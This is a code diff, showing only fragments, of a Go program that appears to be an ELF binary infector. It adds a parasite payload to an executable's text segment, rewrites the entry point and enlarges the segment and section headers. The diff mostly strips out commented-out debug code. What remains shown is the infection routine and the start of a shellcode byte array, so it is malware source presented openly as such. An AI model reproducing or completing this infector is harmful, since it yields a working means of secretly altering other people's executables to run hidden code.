@@ -1,7 +1,7 @@
 /*
-- [1] Increase p_shoff by PAGE_SIZE in the ELF header
+[1] Increase p_shoff by PAGE_SIZE in the ELF header
 [2] Patch the insertion code (parasite) to jump to the entry point (original)
-- [3] Locate the text segment program header
+[3] Locate the text segment program header
 [4] Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
 [5] Increase p_filesz by account for the new code (parasite)
 [6] Increase p_memsz to account for the new code (parasite)
@@ -23,8 +23,6 @@ import (
 	"io"
 	"io/ioutil"
 	"os"
-	//	"encoding/gob"
-	//	"encoding/json"
 	"encoding/binary"
 )
 
@@ -35,12 +33,6 @@ const (
 	x86_PAGE_SIZE int    = 4096
 	PAGE_SIZE     int    = 4096
 )
-
-/*
-	Calculating the OEP
-	mov rax, rip
-; rax - bytes-b4-this-statement + size_of_original_text_segment
-*/
 
 var payload64 = []byte{
 	0x57,       //push   %rdi
@@ -240,44 +232,16 @@ func main() {
 			sectionHdrTable[k].Size += uint64(len(payload64))
 		}
 	}
-	/*for k := 0; k < int(elfHeader.Shnum); k++ {
-		if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == elfHeader.Entry {
-			if debug{
-				fmt.Println("[+] Extending section size of sectionhdr associated with text segment");
-			}
-			sectionHdrTable[k].Size += uint64(len(payload64))
-		}
-	}*/
-	//sectionHeaderTableBytes := make([]byte, int(elfHeader.Shnum) * int(elfHeader.Shentsize))
-	//fmt.Println("Allocated sectionHeaderTableBytes => ", len(sectionHeaderTableBytes));
-	//infectedShdrTable := bytes.NewBuffer(sectionHeaderTableBytes);
+
 	infectedShdrTable := new(bytes.Buffer)
 	binary.Write(infectedShdrTable, binary.LittleEndian, sectionHdrTable)
-
-	//sHdrTableLen := int(elfHeader.Shentsize * elfHeader.Shnum)
-	//fmt.Println("section hdr table len => ", sHdrTableLen);
-	//fmt.Println("calc section hdr table len =>", elfHeader.Shentsize * elfHeader.Shnum);
 
 	finalInfectionTwo := make([]byte, infectedBuf.Len()+int(PAGE_SIZE))
 	fmt.Println("Infected buf len  => ", infectedBuf.Len())
 	finalInfection := infectedBuf.Bytes()
-	/*var readErr error
-	for l :=0; l < sHdrTableLen; l++ {
-		finalInfection[int(oShoff) + l], readErr = infectedShdrTable.ReadByte()
-		checkError(readErr)
-		//fmt.Println("Index => ", l);
-	}
-	*/
+
 	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())
-	/*
-		for m := 0; m < len(payload64); m++ {
-			if debug{
-				fmt.Println("[+] writing payload into the binary")
-			}
-			finalInfection[textSegEnd + uint64(m)] = payload64[m]
-		}
-	*/
-	//end_of_infection :=  int(pHeaders[textNdx].Off + pHeaders[textNdx].Filesz)
+
 	end_of_infection := int(textSegEnd)
 	fmt.Printf("end_of_infection @ 0x%x\n", end_of_infection)
 	copy(finalInfectionTwo, finalInfection[:end_of_infection])
